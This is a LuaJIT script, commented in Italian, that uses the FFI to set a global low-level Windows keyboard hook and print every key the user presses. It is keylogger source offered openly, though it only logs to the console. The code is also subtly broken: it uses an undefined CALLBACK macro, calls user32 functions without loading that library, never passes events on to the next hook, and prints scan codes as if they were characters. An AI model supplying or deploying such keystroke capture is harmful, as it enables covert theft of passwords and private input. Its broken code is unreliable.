-- Carica la libreria ffi di LuaJIT
local ffi = require("ffi")

-- Definisci le funzioni Windows necessarie per intercettare la tastiera
ffi.cdef[[
    typedef unsigned long DWORD;
    typedef void* HWND;
    typedef long LPARAM;
    typedef unsigned int WPARAM;
    typedef long LRESULT;
    typedef struct KBDLLHOOKSTRUCT {
        DWORD vkCode;
        DWORD scanCode;
        DWORD flags;
        DWORD time;
        void* dwExtraInfo;
    } KBDLLHOOKSTRUCT;
    typedef LRESULT (CALLBACK* HOOKPROC)(int nCode, WPARAM wParam, LPARAM lParam);
    
    HWND GetConsoleWindow();
    int GetMessage(void* msg, HWND hWnd, unsigned int wMsgFilterMin, unsigned int wMsgFilterMax);
    int TranslateMessage(void* msg);
    int DispatchMessage(void* msg);
    int SetWindowsHookEx(int idHook, HOOKPROC lpfn, void* hmod, unsigned int dwThreadId);
    int UnhookWindowsHookEx(void* hHook);
    unsigned long MapVirtualKeyA(unsigned long code, unsigned long mapType);
]]

-- Costanti per l'hook e i messaggi di tastiera
local WH_KEYBOARD_LL = 13
local WM_KEYDOWN = 0x0100
local HC_ACTION = 0

-- Variabile per l'hook
local hHook

-- Funzione di log che stampa i tasti premuti
function Log(input)
    print(input)
end

-- Funzione di callback per l'hook della tastiera
local function LowLevelKeyboardProc(nCode, wParam, lParam)
    if nCode == HC_ACTION then
        local pKey = ffi.cast("KBDLLHOOKSTRUCT*", lParam)
        if wParam == WM_KEYDOWN then
            -- Ottieni il codice del tasto virtuale
            local vkCode = pKey.vkCode
            -- Mappa il codice del tasto al carattere corrispondente
            local key = ffi.C.MapVirtualKeyA(vkCode, 0)
            -- Logga il tasto premuto
            Log(string.char(key))
        end
    end
    return 0
end

-- Imposta l'hook della tastiera
hHook = ffi.C.SetWindowsHookEx(WH_KEYBOARD_LL, ffi.cast("HOOKPROC", LowLevelKeyboardProc), nil, 0)

-- Ciclo di messaggi per intercettare gli eventi
local msg = ffi.new("struct { int message; void* wParam; void* lParam; }")
print("Premi Ctrl+C per uscire.")

while ffi.C.GetMessage(msg, nil, 0, 0) ~= 0 do
    ffi.C.TranslateMessage(msg)
    ffi.C.DispatchMessage(msg)
end

-- Rimuovi l'hook alla fine del programma
ffi.C.UnhookWindowsHookEx(hHook)
